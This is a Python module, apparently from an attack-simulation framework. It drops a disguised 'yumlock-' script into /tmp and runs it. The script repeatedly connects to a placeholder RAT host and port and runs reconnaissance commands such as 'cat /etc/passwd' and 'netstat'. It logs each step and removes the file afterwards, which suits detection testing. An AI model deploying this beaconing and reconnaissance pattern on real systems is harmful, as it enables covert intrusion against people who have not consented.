try:
    from framework.main import ModuleBase
except ImportError:
    pass

class ReverseShellOnDisk(ModuleBase):
    RAT = \
        "# {banner}\n" \
        "COMMANDS = ['id', 'cat /etc/passwd', 'w', 'lastlog', 'last', 'ifconfig', 'netstat -an', 'ss -an',\n"\
        "        'ip addr', 'date', 'ps -ef --forest', 'ls -lart']\n" \
        "p = None\n"\
        "try:\n" \
        "    import socket, random, time\n" \
        "    from subprocess import Popen, PIPE\n" \
        "    while True:\n" \
        "        s = socket.socket()\n" \
        "        s.connect(('${RAT_DOMAIN}', ${RAT_PORT}))\n" \
        "        cmd = random.choice(COMMANDS)\n" \
        "        p = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)\n" \
        "        time.sleep(5)\n"\
        "        stdout, stderr = p.communicate()\n" \
        "        s.close()\n" \
        "        p.wait()\n"\
        "except Exception as e:\n" \
        "    pass\n"\
        "if p is not None:\n"\
        "    try:\n"\
        "        p.wait(1)\n"\
        "    except:\n"\
        "        pass\n"

    @property
    def relative_delay(self):
        return 65

    @property
    def absolute_duration(self):
        return 3600

    def run(self):
        self.start()
        import tempfile, os
        handle, fname = tempfile.mkstemp(suffix='.dat', prefix='yumlock-', dir='/tmp')
        os.close(handle)
        with open(fname, 'w') as f:
            f.write(self.RAT.format(banner=self._banner))
        pid = self.util_childproc(fname='/usr/bin/python', args=('/usr/bin/python', fname))
        self.hec_logger('RAT has been started', filename=fname, pid=pid)
        self.util_orphanwait(pid, timeout=self.absolute_duration)
        os.unlink(fname)
        self.hec_logger('RAT exited, removed RAT script', filename=fname, pid=pid)
        self.finish()
